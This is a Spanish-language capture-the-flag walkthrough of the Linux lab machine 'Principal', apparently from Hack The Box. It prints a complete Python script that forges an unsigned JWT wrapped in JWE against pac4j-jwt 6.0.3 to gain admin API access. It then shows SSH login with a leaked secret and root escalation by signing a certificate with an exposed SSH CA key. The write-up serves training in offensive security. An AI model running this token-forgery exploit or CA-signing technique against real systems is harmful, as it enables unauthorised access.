
# Principal

<figure><img src="/files/FawBU09oJDvhG7gDjFOa" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `Principal`
* **IP:** `10.129.244.220`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `07/05/2026`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.244.220 principal.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.129.244.220
```

```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy Jetty
```

Solo encontramos puertos comunes (22 y 8080) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://10.129.244.220:8080` y observamos que parece ser un login de un dashboard de operaciones `Principal`, y encontramos una versión `v1.2.0` lo que nos permitiría buscar exploits públicos:

<figure><img src="/files/JdO5I0HjFqWOMqujvmpV" alt=""><figcaption></figcaption></figure>

#### Versión

En realidad no utiliza la versión `1.2.0` y lo descubrimos con whatweb, donde observamos que usa la versión `6.0.3` de `pac4j-jwt`:

```bash
whatweb -a3 -v http://10.129.244.220:8080

<----SNIP---->

[ X-Powered-By ]
	X-Powered-By HTTP header 
	String       : pac4j-jwt/6.0.3 (from x-powered-by string)
```

***

## <mark style="color:$primary;">Enumeración Web</mark>

### Código fuente

Encontramos que esta aplicación sirve una aplicación javascript en la siguiente ruta:

```html
<script src="/static/js/app.js"></script>
```

Al ver el código fuente vemos que expone varios endpoints de la api, entre ellos un endpoint de usuarios:

<figure><img src="/files/58B0AGdFPsClrwUcW3Ux" alt=""><figcaption></figcaption></figure>

### Enumeración de la API

El endpoint `/api/auth/jwks` expone una key:

{% code overflow="wrap" %}

```bash
curl -i "http://10.129.244.220:8080/api/auth/jwks"

HTTP/1.1 200 OK
Date: Thu, 07 May 2026 16:20:46 GMT
Server: Jetty
X-Powered-By: pac4j-jwt/6.0.3
Content-Type: application/json
Transfer-Encoding: chunked

{"keys":[{"kty":"RSA","e":"AQAB","kid":"enc-key-1","n":"lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"}]}
```

{% endcode %}

Y no podemos listar los usuarios sin un Bearer token:

{% code overflow="wrap" %}

```bash
curl -i "http://10.129.244.220:8080/api/users"    

HTTP/1.1 401 Unauthorized
Date: Thu, 07 May 2026 16:22:17 GMT
Server: Jetty
X-Powered-By: pac4j-jwt/6.0.3
Content-Type: application/json
Content-Length: 58

{"error":"Unauthorized","message":"Bearer token required"}
```

{% endcode %}

### Crear un Script de Token Forgery

Creamos el script `forge.py`:

```python
#!/usr/bin/env python3
import json
import time
import base64
import requests
from jwcrypto import jwk, jwe

BASE = "http://10.129.244.220:8080"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
# Fetch public JWKS
jwks = requests.get(f"{BASE}/api/auth/jwks", timeout=10).json()
pub = jwk.JWK.from_json(json.dumps(jwks["keys"][0]))
now = int(time.time())
claims = {
    "sub": "admin",
    "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": now,
    "exp": now + 3600
}
# Build unsecured inner JWT manually: header.payload.
inner_header = {
    "alg": "none",
    "typ": "JWT"
}
inner_token = (
    b64url(json.dumps(inner_header, separators=(",", ":")).encode()) + "." +
    b64url(json.dumps(claims, separators=(",", ":")).encode()) + "."
)
# Encrypt the inner JWT as JWE
outer = jwe.JWE(
    plaintext=inner_token.encode(),
    protected={
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "cty": "JWT",
        "kid": jwks["keys"][0].get("kid", "enc-key-1")
    }
)
outer.add_recipient(pub)
print(outer.serialize(compact=True))
```

{% code overflow="wrap" %}

```bash
python3 forge.py

eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMTI4R0NNIiwia2lkIjoiZW5jLWtleS0xIn0.SFNixgyKt33PD-JP34mbDQGTe6WXpYLH0dsrmGswU5du9OD9IcT9m5zVgQejR4c9EFArAwjo96K9oyXkyzBpH4FZA0C_1mRRd0tqe_OLp3PBddthf-k4H_NRos_dSdcIGJehg5pbFQBjElsoBCH31o2FF0iLYxSEUnMu_MSr6XeVRr6-x-s4aBykOguivQhN9PxLbgmxNNH4W28ErFIg_HGQHTfcBjtZ9RES-8wIMroKJB5uRBgF4AIfshy4ltdZKCPzGfBrAI1wikuJ9ZKfogr8NMvp0J1tGWDfOzkw8dXo1d-GWgZokhIJ_LZs4tKM2euF6ulZxhMf0pIh6wcNTg.6SKBUL1OyLsitK5M.2yEXvRpS-SFlsvRC37jhXY1plXBjrNa6EMrNRLwh-aPLLQTQIugDCFaVfL059vJVm_MyvsmkqeE4u_eCcBwq3XEMqy7XJVybFhOnzku4nkB_YrWyMnGQNfuWtHQ-p5Lag3hSd0hysD3CAHMxzQG-Hq7eQen9VDxQsodjmE9q6JSusgJWCmrJJiGNttrL6QFNR6iaRipKgLaQ-sWfW0njsAo_Iq5x.JO9Uw4EIRAPVn-k39fEkiA
```

{% endcode %}

Tenemos un token JWT válido.

### Enumeración con token

```bash
TOKEN="eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMTI4R0NNIiwia2lkIjoiZW5jLWtleS0xIn0.HEqlx-XEiCXk5nas4kSqRXaDKTX3WB5HYSt7UAMFO1NRpOOEBhu1TfZRPf_cVGhTCoJ8gdcu1OVWuE2c2LyJ7Z6nbYMgVXzlOvPvXfUTU-LWdeZ1iJTWvVh2Jsdvti1oR6m55s3iSPicYtEpD2qBeS860MvJKgGLZuaOv5ipUe3eyAl7nuz2UO-3jYanQcJa5qmRygOJYAmrRQw90PLMrhThPTYt0SeHRxefNvd5jeTU0uIz_uVmmT3uiie02vwIxn4t1j56o4zXl1ZmT5R8Dd_rHwEqAsMtq77N_BBCZok2qHRFX1ThBOY9mE6FbOwDUBretWkMhC_m8ERFZh4ZPw.02H9b3036x3A71k0.DIFuRFbgU33utkXoAE-Ew01_ml1GoyAMB6uTSqt31mG0phq1Z1YTTFeRYAVKJ0T4OymwjOjmODk9f82e0xoMYT5MzX2-XFkjKx8eOHo0aiQC9gjtidib7wu4gGg7uoIP7xqjO5Ic3TPYAdpfCrtO9yaiRiPa1ktvBKCLnBhMnHSSCFqZKc8oyXgVJD-Y_h0un3wZPLa6ivErCjYXEGrm-UjWWgJ4.R4pWp91-6XNNb3soougPcw"
```

#### Enumerar usuarios

Conseguimos obtener todos los usuarios del sistema:

```bash
curl -s -H "Authorization: Bearer $TOKEN" http://10.129.244.220:8080/api/users | jq '.'
{
  "users": [
    {
      "active": true,
      "role": "ROLE_ADMIN",
      "note": "",
      "username": "admin",
      "email": "s.chen@principal-corp.local",
      "displayName": "Sarah Chen",
      "department": "IT Security",
      "id": 1,
      "lastLogin": "2025-12-28T09:15:00Z"
    },
    {
      "active": true,
      "role": "deployer",
      "note": "Service account for automated deployments via SSH certificate auth.",
      "username": "svc-deploy",
      "email": "svc-deploy@principal-corp.local",
      "displayName": "Deploy Service",
      "department": "DevOps",
      "id": 2,
      "lastLogin": "2025-12-28T14:32:00Z"
    },
    
    <----SNIP---->
```

#### API Settings

El endpoint `/api/settings` expone una contraseña en plano:

```bash
curl -s -H "Authorization: Bearer $TOKEN" http://10.129.244.220:8080/api/settings | jq '.' 

{
  "integrations": [
    {
      "status": "connected",
      "name": "GitLab CI/CD",
      "lastSync": "2025-12-28T12:00:00Z"
    },
    {
      "status": "connected",
      "name": "Vault",
      "lastSync": "2025-12-28T14:00:00Z"
    },
    {
      "status": "connected",
      "name": "Prometheus",
      "lastSync": "2025-12-28T14:30:00Z"
    }
  ],
  "security": {
    "authFramework": "pac4j-jwt",
    "authFrameworkVersion": "6.0.3",
    "jwtAlgorithm": "RS256",
    "jweAlgorithm": "RSA-OAEP-256",
    "jweEncryption": "A128GCM",
    "encryptionKey": "D3pl0y_$$H_Now42!",
    "tokenExpiry": "3600s",
    "sessionManagement": "stateless"
  },
```

```
"encryptionKey": "D3pl0y_$$H_Now42!"
```

### Injectar token en el navegador

1. Abre la página de inicio de sesión:

```
http://10.129.8.191:8080/login
```

2. Abre las herramientas para desarrolladores del navegador.
3. Ve a la consola de JavaScript.
4. Ejecuta:

```bash
sessionStorage.setItem( "auth_token" , "PASTE_TOKEN_HERE" ) 
location.href = "/dashboard"
```

Reemplaza `PASTE_TOKEN_HERE` con el token generado por `forge.py`.

Automáticamente nos logueamos y accedemos al dashboard:

<figure><img src="/files/niKMz273hxWYp0RL6C2W" alt=""><figcaption></figcaption></figure>

Aquí podemos ver de forma gráfica todos los usuarios y sus roles:

<figure><img src="/files/Sse6RYcTT8PP6GkMMYYD" alt=""><figcaption></figcaption></figure>

Y la configuración del sistema:

<figure><img src="/files/LLqWHmumTvuGP03a5J18" alt=""><figcaption></figcaption></figure>

### Información clave <a href="#id-5ee0" id="id-5ee0"></a>

El valor `D3pl0y_$$H_Now42!` aparece en la configuración y probablemente se trata de una contraseña o un secreto de implementación. El registro de actividad también hace referencia a `svc-deploy`, lo que convierte a esa cuenta en el punto de acceso SSH más probable.

***

## <mark style="color:$primary;">Acceso SSH</mark>

```bash
ssh svc-deploy@10.129.244.220

The authenticity of host '10.129.244.220 (10.129.244.220)' can't be established.
ED25519 key fingerprint is SHA256:ibvdsZXiwJ6QUMPTxoH3spRA8hV9mbd98MLpLt3XG/E.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.244.220' (ED25519) to the list of known hosts.
svc-deploy@10.129.244.220's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
svc-deploy@principal:~$ whoami
svc-deploy
```

***

## <mark style="color:$primary;">User Flag</mark>

```bash
svc-deploy@principal:~$ ls
user.txt
svc-deploy@principal:~$ cat user.txt 
688d58e66812ab450fa3def3********
```

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario `svc-deploy`, pero observamos que pertenece a un grupo interesante "`deployers`":

```bash
svc-deploy@principal:~$ sudo -l
[sudo] password for svc-deploy: 
Sorry, user svc-deploy may not run sudo on principal.

svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

### Buscar archivos con propiedad del grupo

```bash
svc-deploy@principal:~$ find / -group deployers -type f 2>/dev/null
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca
```

Encontramos el archivo de configuración SSH con algunas directivas:

```bash
svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf

# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

La clave pública asociada (`ca.pub`) probablemente está configurada en el servidor SSH como `TrustedUserCAKeys`, permitiendo que certificados firmados por esta CA autentiquen a cualquier usuario (incluyendo root).

{% code overflow="wrap" %}

```bash
svc-deploy@principal:~$ cat /opt/principal/ssh/ca.pub   
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC6lxNSzJQFU3K/0FLKci1BZr+HL1UTQ45y8nzlu0tVaCFcluEZZyPu3wgC4XbCGmihm8wyoBgJXI6BZyRTpizmHJZAjNmvi9ncUoS06Rpl+oAv8E3GugdcQoglSP7Nem0JnpmHoOL/FtStaKPTtoEYHWc3rVd6YBGfXCrF0lEgFsQcwFOLkPoS35IdnZqcj3vBtz7Asod2qiWztk6l2UHjZyrUKUxiRERXsr7uNtY9xSgA1ClhZdx3MUE1intkbUgdFC1yYXS+lsvlUD/N54YYLSKH7GVsMFzV/cWsxgx8z9CfgDvS+M0BVRrGiETmcY1jALOTln7PCnLl2vC1Rr0j7btu99DYrLmYj4L9OgKjHeX7InVQCGnoRHWpThyp3WmdnWoghAiyALuiL39XXQpen2t7GQd+zT5Qbv2HpLW4huVKXoY+22KSbVsAhFAexgZy04fxKZw6M5YzzIA28JWnIXdCbxdYhVm8QzlnKHEhI2J1T/9wrUvBFQQExmXrt/HHmJZrjNfjkd4tUsarLlANJ7ilNMNSzk3QuJp2t2I7IBO6JO8eQt5jEFSPbtIav9u8vPsTLMRjMfrpqxiAA+VAozzeOYZLEhCWatWTQw6wzpnb9+qfAoQj1kGhPTelOtmdLx8dJtqSw5O4HMAhlnItjqrxr57+333Fg1iaqBvsmQ== principal-ssh-ca
```

{% endcode %}

Encontramos una clave privada SSH en `/opt/principal/ssh/ca`:

```bash
svc-deploy@principal:~$ cat /opt/principal/ssh/ca        
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAupcTUsyUBVNyv9BSynItQWa/hy9VE0OOcvJ85btLVWghXJbhGWcj
7t8IAuF2whpooZvMMqAYCVyOgWckU6Ys5hyWQIzZr4vZ3FKEtOkaZfqAL/BNxroHXEKIJU
j+zXptCZ6Zh6Di/xbUrWij07aBGB1nN61XemARn1wqxdJRIBbEHMBTi5D6Et+SHZ2anI97
wbc+wLKHdqols7ZOpdlB42cq1ClMYkREV7K+7jbWPcUoANQpYWXcdzFBNYp7ZG1IHRQtcm
F0vpbL5VA/zeeGGC0ih+xlbDBc1f3FrMYMfM/Qn4A70vjNAVUaxohE5nGNYwCzk5Z+zwpy
5drwtUa9I+27bvfQ2Ky5mI+C/ToCox3l+yJ1UAhp6ER1qU4cqd1pnZ1qIIQIsgC7oi9/V1
0KXp9rexkHfs0+UG79h6S1uIblSl6GPttikm1bAIRQHsYGctOH8SmcOjOWM8yANvCVpyF3
Qm8XWIVZvEM5ZyhxISNidU//cK1LwRUEBMZl67fxx5iWa4zX45HeLVLGqy5QDSe4pTTDUs
5N0LiadrdiOyATuiTvHkLeYxBUj27SGr/bvLz7EyzEYzH66asYgAPlQKM83jmGSxIQlmrV
<----SNIP---->
```

### Escalar a root usando la CA

Primero verificamos que el grupo `deployers` tiene acceso de lectura:

```bash
svc-deploy@principal:~$ ls -la /opt/principal/ssh/
total 20
drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
drwxr-xr-x 5 root root      4096 Mar 11 04:22 ..
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub
```

#### **1. Genera un par de claves SSH para el certificado**.&#x20;

Puedes hacerlo en `/tmp`:

```bash
svc-deploy@principal:~$ cd /tmp
svc-deploy@principal:/tmp$ ssh-keygen -t rsa -b 4096 -f /tmp/root_key -N ""
Generating public/private rsa key pair.
Your identification has been saved in /tmp/root_key
Your public key has been saved in /tmp/root_key.pub
The key fingerprint is:
SHA256:h9ayJCbzca14sizBXhCfGuN3qwtyFyzS2DP2SBkhdxU svc-deploy@principal
The key's randomart image is:
+---[RSA 4096]----+
|  . o ..E.       |
|   o.o           |
|    .o .         |
|   +++o  +       |
|  oo%=* S +      |
|   +=@oO.=       |
|  ..++*.+.       |
|   oo+ +.        |
|     .=o         |
+----[SHA256]-----+
```

#### **2. Firma la clave pública con la CA** para el usuario `root`:

```bash
svc-deploy@principal:/tmp$ ssh-keygen -s /opt/principal/ssh/ca -I root -n root -V +1w /tmp/root_key.pub
Signed user key /tmp/root_key-cert.pub: id "root" serial 0 for root valid from 2026-05-07T17:12:00 to 2026-05-14T17:13:51
```

Esto genera `/tmp/root_key-cert.pub`.

#### **3. Conéctate como root vía SSH**

Usando la clave privada y el certificado desde la propia sesión de SSH:

```bash
svc-deploy@principal:~$ ssh -i /tmp/root_key root@localhost -p 22
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@principal:~# whoami
root
```

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

```bash
root@principal:~# cd /root
root@principal:~# ls
root.txt
root@principal:~# cat root.txt 
ddfe41ce72651e8ffaa20237********
```
